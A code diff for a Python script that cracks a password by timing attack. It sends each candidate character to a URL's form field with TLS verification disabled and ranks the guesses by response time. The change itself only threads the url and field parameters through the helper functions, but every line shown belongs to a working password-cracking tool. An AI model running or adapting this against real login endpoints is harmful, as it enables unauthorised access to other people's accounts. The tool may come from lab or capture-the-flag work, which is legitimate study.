@@ -16,7 +16,7 @@ INVALID_CHAR = '`'
 
 
 # make a single guess and return the time it took to make
-def make_guess(guess):
+def make_guess(guess, url, field):
     payload = {field: guess}
     r = requests.post(url, data=payload, verify=False)
 
@@ -26,14 +26,14 @@ def make_guess(guess):
 
 
 # make one round of guesses, and return results sorted by decreasing time
-def get_sorted_guesses(known):
+def get_sorted_guesses(known, url, field):
     guesses = {}
 
     for this_char in CHARSET:
         # guess must have an invalid trailing character so that we get an indication when this_char is correct
         guess = known + this_char + INVALID_CHAR
 
-        guesses[guess] = make_guess(guess)
+        guesses[guess] = make_guess(guess, url, field)
 
     return sorted(guesses.items(), key=operator.itemgetter(1), reverse=True)
 
@@ -48,7 +48,7 @@ def crack_password(url, field):
     #
 
     while True:
-        sorted_guesses = get_sorted_guesses(known)
+        sorted_guesses = get_sorted_guesses(known, url, field)
 
         # our best guess is the first entry in the list
         best_guess = sorted_guesses[0]
@@ -82,7 +82,7 @@ def crack_password(url, field):
     #
 
     while True:
-        sorted_guesses = get_sorted_guesses(known)
+        sorted_guesses = get_sorted_guesses(known, url, field)
 
         # our best guess is the first entry in the list
         best_guess = sorted_guesses[0]
